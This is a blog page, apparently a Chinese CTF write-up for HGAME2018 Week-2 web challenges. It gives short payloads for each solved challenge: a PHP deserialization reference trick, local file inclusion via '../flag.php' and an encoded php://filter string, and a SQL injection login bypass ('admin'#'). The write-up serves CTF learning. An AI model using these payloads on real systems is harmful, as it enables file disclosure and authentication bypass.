@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>HGAME2018 Week-2 Web Writeup | Klaus&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Random点开链接以后里面啥都没有…所以猜测这里一定有源码泄露什么的，所以/.random.php.swp就能get源码，Notepad++打开以后发现源码是损坏的，所以需要对源码进行修复，因为是.swp，所以直接扔到Ubuntu里面 vim -r就OK。">
+<meta name="keywords" content="CTF_Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME2018 Week-2 Web Writeup">
+<meta property="og:url" content="http://yoursite.com/2018/02/27/HGAME2018-Week-2-Writeup/index.html">
+<meta property="og:site_name" content="Klaus&#39;s Blog">
+<meta property="og:description" content="Random点开链接以后里面啥都没有…所以猜测这里一定有源码泄露什么的，所以/.random.php.swp就能get源码，Notepad++打开以后发现源码是损坏的，所以需要对源码进行修复，因为是.swp，所以直接扔到Ubuntu里面 vim -r就OK。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2018/02/27/5a9540e4e41d5.jpg">
+<meta property="og:updated_time" content="2018-07-25T09:10:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HGAME2018 Week-2 Web Writeup">
+<meta name="twitter:description" content="Random点开链接以后里面啥都没有…所以猜测这里一定有源码泄露什么的，所以/.random.php.swp就能get源码，Notepad++打开以后发现源码是损坏的，所以需要对源码进行修复，因为是.swp，所以直接扔到Ubuntu里面 vim -r就OK。">
+<meta name="twitter:image" content="https://i.loli.net/2018/02/27/5a9540e4e41d5.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Klaus&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Klaus&#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">MIA SAN MIA</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-HGAME2018-Week-2-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/02/27/HGAME2018-Week-2-Writeup/" class="article-date">
+  <time datetime="2018-02-27T11:20:39.000Z" itemprop="datePublished">2018-02-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HGAME2018 Week-2 Web Writeup
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+	  <!-- Table of Contents -->
+		
+		  <div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Random"><span class="toc-number">1.</span> <span class="toc-text">Random</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#草莓社区-1"><span class="toc-number">2.</span> <span class="toc-text">草莓社区-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#草莓社区-2"><span class="toc-number">3.</span> <span class="toc-text">草莓社区-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-1"><span class="toc-number">4.</span> <span class="toc-text">xss-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-2"><span class="toc-number">5.</span> <span class="toc-text">xss-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最简单的sql题"><span class="toc-number">6.</span> <span class="toc-text">最简单的sql题</span></a></li></ol>
+		  </div>
+		
+        <h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>点开链接以后里面啥都没有…所以猜测这里一定有源码泄露什么的，所以/.random.php.swp就能get源码，Notepad++打开以后发现源码是损坏的，所以需要对源码进行修复，因为是.swp，所以直接扔到Ubuntu里面 vim -r就OK。<br><a id="more"></a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> (<span class="string">'flag.php'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $public;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $secret;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_GET[<span class="string">'emmm'</span>]) &#123;</span></span><br><span class="line"><span class="php">    $emmm = unserialize($_GET[<span class="string">'emmm'</span>]);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!is_object($emmm)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"error"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $emmm-&gt;public = random_int(<span class="number">0</span>, <span class="number">100000000</span>);</span></span><br><span class="line"><span class="php">    $emmm-&gt;secret = random_int(<span class="number">0</span>, <span class="number">100000000</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($emmm-&gt;public == $emmm-&gt;secret) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">#highlight_file(__FILE__);</span></span></span><br></pre></td></tr></table></figure>
+<p>好咯，这里就是代码审计的过程，通过$_GET的方式来获取emmm的值，在序列化解析，如果序列化解析后emmm是一个对象，那就退出，所以这里要先对emmm进行序列化操作。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $public;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $secret;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$emmm=<span class="keyword">new</span> emmm();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($emmm);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>序列化以后的结果是：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"emmm"</span>:<span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">6</span>:<span class="string">"public"</span>;N;<span class="string">s:</span><span class="number">6</span>:<span class="string">"secret"</span>;N;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接着往下审计，这里需要public的值和secret的值相等，php支持引用赋值，因为secret的编号为2，所以进行赋值的序列化语句需要进行相关修改。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"emmm"</span>:<span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">6</span>:<span class="string">"public"</span>;N;<span class="string">s:</span><span class="number">6</span>:<span class="string">"secret"</span>;<span class="string">R:</span><span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>php中-&gt;对象引用（r）,指针引用（R）<br>这里强烈推荐刺珩师傅的博客，搜反序列化构造的时候能看到这篇博客很惊喜：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>c1h3ng.github.io<span class="regexp">/php/</span><span class="number">2017</span><span class="regexp">/09/</span><span class="number">20</span><span class="regexp">/php-serialize/</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="草莓社区-1"><a href="#草莓社区-1" class="headerlink" title="草莓社区-1"></a>草莓社区-1</h2><p>这个题已经提示了是本地包含，首页的index.html下面有两个链接，其中一个链接是show_maopian.php?mao=2.jpg，因为LFI，所以直接mao=../flag.php就能拿到flag.php的base64，解密以后就是flag。</p>
+<h2 id="草莓社区-2"><a href="#草莓社区-2" class="headerlink" title="草莓社区-2"></a>草莓社区-2</h2><p>哭晕在厕所我做的是对的，因为火狐的问题显示不出来我还以为我做错了，直到我扔到了Chrome…<br>题目提示LFI，所以开始测试LFI，php://input没有反应，但是测试php://filter/read=convert.base64-encode/resource=../flag.php，在火狐的查看元素里面查看参数发现read等号后面的全部被过滤掉了，所以对等号进行url编码，%3d进行绕过。<br>payload:<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mao=php://<span class="keyword">filter</span>/read<span class="symbol">%3</span>dconvert.base<span class="number">64</span>-encode/resource<span class="symbol">%3</span>d../flag.php</span><br></pre></td></tr></table></figure></p>
+<p>然后扔到Chrome里面就有flag的加密base64，解密一下就好。<br><img src="https://i.loli.net/2018/02/27/5a9540e4e41d5.jpg" alt></p>
+<h2 id="xss-1"><a href="#xss-1" class="headerlink" title="xss-1"></a>xss-1</h2><h2 id="xss-2"><a href="#xss-2" class="headerlink" title="xss-2"></a>xss-2</h2><p>两道xss没做，等我重新学习一下就解决这两题。</p>
+<h2 id="最简单的sql题"><a href="#最简单的sql题" class="headerlink" title="最简单的sql题"></a>最简单的sql题</h2><p>这题真的好简单…看到登录框我以为可能需要写个脚本啥的，然后开始测试admin’#，密码随便输的，然后就有flag了。</p>
+<p>写在最后…这次HGAME2018的flag放出来我的Hexo就报错，我也懒截图了，所以把flag全删了…</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/02/27/HGAME2018-Week-2-Writeup/" data-id="cktfedox8000qf4ukjlpsli7m" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/03/03/HGAME2018-Week-3-Web-Writeup/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          HGAME2018 Week-3 Web Writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/02/20/sqlilabs-Less8-Less10-writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sqlilabs Less8~Less10 writeup</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+    <h3 class="widget-title">联系方式</h3>
+    <div class="widget">
+	  <li><a>klausvon@163.com</a></li>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">目录</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Algorithm/">Algorithm</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTML/">HTML</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/NLP/">NLP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/NLP-知识图谱/">NLP,知识图谱</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/VQA/">VQA</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/XSS漏洞学习/">XSS漏洞学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/数学学习/">数学学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞学习/">漏洞学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境配置/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/神经网络/">神经网络</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/">Algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML/">HTML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ML/">ML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Model-Compression/">Model Compression</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NLP/">NLP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL-injection/">SQL_injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VQA/">VQA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/凸包算法/">凸包算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/大数据/">大数据</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数学学习/">数学学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据挖掘/">数据挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境配置/">环境配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/知识图谱/">知识图谱</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/神经网络/">神经网络</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Algorithm/" style="font-size: 14.29px;">Algorithm</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF-Web/" style="font-size: 18.57px;">CTF_Web</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/ML/" style="font-size: 11.43px;">ML</a> <a href="/tags/Model-Compression/" style="font-size: 10px;">Model Compression</a> <a href="/tags/NLP/" style="font-size: 20px;">NLP</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Python/" style="font-size: 11.43px;">Python</a> <a href="/tags/SQL-injection/" style="font-size: 12.86px;">SQL_injection</a> <a href="/tags/VQA/" style="font-size: 10px;">VQA</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/凸包算法/" style="font-size: 10px;">凸包算法</a> <a href="/tags/大数据/" style="font-size: 10px;">大数据</a> <a href="/tags/开发/" style="font-size: 18.57px;">开发</a> <a href="/tags/数学学习/" style="font-size: 11.43px;">数学学习</a> <a href="/tags/数据挖掘/" style="font-size: 11.43px;">数据挖掘</a> <a href="/tags/环境配置/" style="font-size: 10px;">环境配置</a> <a href="/tags/知识图谱/" style="font-size: 17.14px;">知识图谱</a> <a href="/tags/神经网络/" style="font-size: 15.71px;">神经网络</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/07/31/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/03/Basic-Understanding-of-Optimization/">Basic Understanding of Optimization</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/02/Why-Deep-Structure/">Why Deep Structure</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/23/Model-Compression-基本概念/">What is Model Compression</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/21/CSS在开发中的基本操作小结/">CSS在开发中的基本操作小结</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    <div class="widget-wrap">
+    <h3 class="widget-title">友情链接</h3>
+    <div class="widget">
+	 <a class="theme-link"  href="https://mteacher.top/"> martini's blog </a><span>&nbsp;&nbsp;</span>
+    </div>
+  </div>
+
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Klaus<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
